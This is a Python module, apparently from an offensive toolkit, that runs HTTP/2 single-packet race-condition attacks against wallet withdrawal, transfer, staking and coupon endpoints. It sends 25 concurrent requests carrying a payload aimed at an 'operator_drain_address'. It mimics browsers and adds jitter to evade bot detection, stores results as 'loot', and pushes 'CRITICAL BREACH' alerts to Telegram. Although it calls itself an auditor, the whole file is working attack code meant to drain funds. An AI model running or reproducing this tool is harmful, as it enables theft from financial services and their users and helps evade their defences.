#!/usr/bin/env python3
"""
RACE_CONDITION.PY v8.8 — HTTP/2 Single-Packet Concurrency Engine
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import random
import sys
from datetime import datetime, timezone
from pathlib import Path

import httpx

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof

MODULE = "RACE_CONDITION"
VERSION = "8.8"

BASE_DIR = Path(__file__).resolve().parent.parent
EVIDENCE_DIR = BASE_DIR / "loot_output"

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "GRAY": "\033[90m",
    "RESET": "\033[0m",
}

HIGH_VALUE_KEYWORDS = [
    "critical", "bypass", "success", "loot", "token", "session",
    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "concurrency",
]

CHALLENGE_MARKERS = (
    "<title>security check</title>",
    "cf-browser-verification",
    "attention required!",
    "just a moment...",
    'id="cf-challenge',
    "challenge-platform",
)

_background_tasks: set[asyncio.Task] = set()


def timestamp():
    return datetime.now(timezone.utc).isoformat()


def log(msg, color="GREEN"):
    ansi_color = COLORS.get(color, color)
    sys.stdout.write(f"{ansi_color}[{MODULE}] {msg}{COLORS['RESET']}\n")
    sys.stdout.flush()


def _is_challenge_or_spa(body: str, headers: dict | None = None) -> bool:
    text = body or ""
    lower = text.lower()
    hdr_text = str(headers or "").lower()

    if any(marker in lower for marker in CHALLENGE_MARKERS):
        return True
    if "cf-mitigated" in hdr_text or "security check" in lower:
        return True

    content_type = ""
    if isinstance(headers, dict):
        for k, v in headers.items():
            if str(k).lower() == "content-type":
                content_type = str(v).lower()
                break

    if "application/json" in content_type:
        return False

    return (
        '<div id="root">' in text
        or '<div id="__next">' in text
        or '<div id="__nuxt">' in text
        or "<!doctype html>" in lower
        or "<html" in lower
        or len(text.strip()) < 150
        or "login-form" in lower
    )


async def broadcast_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await asyncio.wait_for(
                send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details),
                timeout=8,
            )
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Non-blockingly fires Telegram alerts for verified findings."""
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            return

        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


async def fire_multiplexed_stream(client, url, headers, cookies, payload):
    try:
        response = await client.post(url, headers=headers, cookies=cookies, json=payload, timeout=7.0)
        return {
            "status": response.status_code,
            "body": response.text,
            "headers": dict(response.headers),
        }
    except Exception as exc:
        return {"status": 0, "body": str(exc), "headers": {}}


class RaceConditionAuditor:
    def __init__(self, target_url, port=443, use_ssl=True, session_pool=None):
        self.raw_target = target_url
        self.port = port
        self.use_ssl = use_ssl
        self.session_pool = session_pool
        self.base_url = target_url.rstrip("/")
        self.suppressed = False

        self.target_endpoints = [
            "/api/v1/wallet/withdraw",
            "/api/withdraw",
            "/user/withdraw/confirm",
            "/api/v1/transfer",
            "/transfer",
            "/api/v1/staking/claim",
            "/api/v1/rewards/redeem",
            "/api/v1/auth/exchange",
            "/api/coupon/apply",
        ]
        self.findings = []

    async def run(self):
        log("INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT (V8.8 HARDENED)", "MAGENTA")

        cookies = (
            dict(self.session_pool.cookie_jar)
            if self.session_pool and hasattr(self.session_pool, "cookie_jar")
            else {}
        )

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
        ]

        default_headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
        }
        default_headers.update(get_randomized_hints())

        if self.session_pool and hasattr(self.session_pool, "default_headers") and self.session_pool.default_headers:
            default_headers.update(self.session_pool.default_headers)

        test_payload = {
            "amount": 100.00,
            "currency": "USD",
            "destination": "operator_drain_address",
        }

        async with httpx.AsyncClient(
            base_url=self.base_url,
            http2=True,
            verify=False,
            follow_redirects=True,
            timeout=10.0,
        ) as client:
            try:
                apply_behavioral_jitter()
                await client.get("/", headers=default_headers)
            except Exception:
                pass

            for endpoint in self.target_endpoints:
                tasks = [
                    fire_multiplexed_stream(client, endpoint, default_headers, cookies, test_payload)
                    for _ in range(25)
                ]
                results = await asyncio.gather(*tasks)

                challenge_hits = 0
                verified_hits = 0
                verified_bodies = []

                for res in results:
                    status = res.get("status", 0)
                    body = res.get("body", "")
                    headers = res.get("headers") or {}
                    body_lower = body.lower()

                    if _is_challenge_or_spa(body, headers):
                        if any(m in body_lower for m in CHALLENGE_MARKERS) or "security check" in body_lower:
                            challenge_hits += 1
                        continue

                    is_valid_success = status in (200, 201) and any(
                        k in body_lower
                        for k in (
                            '"success":true',
                            '"status":"success"',
                            '"transaction_id"',
                            '"tx_hash"',
                            '"new_balance"',
                            "transfer completed",
                            "withdrawal processed",
                        )
                    )

                    if is_valid_success:
                        verified_hits += 1
                        verified_bodies.append(body)

                if challenge_hits > 0 and verified_hits == 0:
                    self.suppressed = True
                    log(f"Suppressed challenge/SPA responses on {endpoint} ({challenge_hits}/25)", "YELLOW")
                    continue

                if verified_hits > 1:
                    log(
                        f"RACE CONDITION VULNERABILITY CONFIRMED AT {endpoint}! Verified windows: {verified_hits}/25",
                        "RED",
                    )

                    sample_body = verified_bodies[0] if verified_bodies else ""
                    loot_hash = hashlib.sha256(sample_body.encode("utf-8")).hexdigest()

                    finding = {
                        "vector": "HTTP/2 Single-Packet Race Condition",
                        "endpoint": f"{self.base_url}{endpoint}",
                        "successful_streams": verified_hits,
                        "total_fired": 25,
                        "verified": True,
                        "severity": "CRITICAL",
                        "integrity_hash": loot_hash,
                        "evidence": "Multiple non-challenge state-changing responses accepted in concurrency window",
                        "timestamp": timestamp(),
                    }
                    self.findings.append(finding)

                    stream_proof(
                        "RACE_CONDITION_SUCCESS",
                        endpoint,
                        {"successful_streams": verified_hits},
                        sample_body[:300],
                        finding,
                    )
                    save_session_loot(
                        target=self.base_url,
                        endpoint=endpoint,
                        finding_type="RACE_CONDITION_SUCCESS",
                        status=200,
                        headers=default_headers,
                        body=sample_body,
                        extra_loot=finding,
                    )
                    broadcast_tg_alert_sync("HTTP/2 Race Condition Confirmed", finding)
                    break

        return self.save_report()

    def save_report(self):
        EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
        report = {
            "module": MODULE,
            "version": VERSION,
            "target": self.raw_target,
            "generated_at": timestamp(),
            "suppressed": self.suppressed and len(self.findings) == 0,
            "summary": {
                "endpoints_tested": len(self.target_endpoints),
                "confirmed_vulnerabilities": len(self.findings),
            },
            "findings": self.findings,
        }

        filename = f"race_condition_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"
        output_path = EVIDENCE_DIR / filename
        output_path.write_text(json.dumps(report, indent=4, ensure_ascii=False), encoding="utf-8")

        report["report_path"] = str(output_path)
        return report


async def run_race_condition_test(
    cognitive_operator=None,
    target_url=None,
    port=443,
    use_ssl=True,
    session_pool=None,
    **kwargs,
):
    if target_url is None and isinstance(cognitive_operator, str):
        target_url = cognitive_operator
    if not target_url:
        raise ValueError("target_url is required.")

    auditor = RaceConditionAuditor(target_url, port=port, use_ssl=use_ssl, session_pool=session_pool)
    return await auditor.run()


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="HTTP/2 Race Condition Auditor")
    parser.add_argument("target", help="Target URL (e.g. https://cryptobytes.online)")
    args = parser.parse_args()
    asyncio.run(run_race_condition_test(target_url=args.target))
